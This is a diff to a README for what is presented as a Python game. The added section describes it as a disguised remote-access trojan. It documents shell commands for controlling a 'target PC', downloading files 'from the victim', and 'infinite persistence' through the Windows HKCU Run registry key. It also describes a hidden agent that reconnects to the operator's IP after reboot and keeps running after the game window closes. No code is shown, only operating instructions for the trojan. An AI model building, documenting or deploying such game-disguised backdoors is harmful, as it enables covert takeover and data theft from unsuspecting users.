@@ -46,6 +46,27 @@ python game/main_game.py --host <NEW_IP_ADDRESS>
 > [!TIP]
 > **Firewall Note**: If the connection fails, verify connectivity with `ping 10.12.73.251`. Ensure the listener PC is reachable on the local network.
 
+## Majestic Shell Operations
+Once a connection is established, you can operate the target PC with full control.
+
+### 🎮 Navigation & File Control
+| Command | Action |
+| :--- | :--- |
+| `ls` | List files in current directory |
+| `cd <path>` | Move to a new directory (e.g., `cd C:\Users\Public`) |
+| `cat <file>` | View file content in the terminal |
+| `pwd` | Show current working directory |
+| `download <file>` | **New!** Securely download a file from the victim to your `tools/downloads` folder |
+| `quit` | Exit the current shell session |
+
+### 🛡️ Infinite Persistence
+The game is pre-configured to be "unbreakable" once accepted:
+- **Registry Injection**: On Windows, the game adds itself to `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`. 
+- **Reboot Survival**: If the target PC restarts, the hidden agent automatically starts and reconnects to your IP.
+- **Detached Mode**: Closing the game window does NOT stop the shell. The agent remains in the background.
+
+---
+
 ## Controls
 - **WASD**: Move Antivirus Avatar
 - **Space**: High-velocity Plasma Bolt
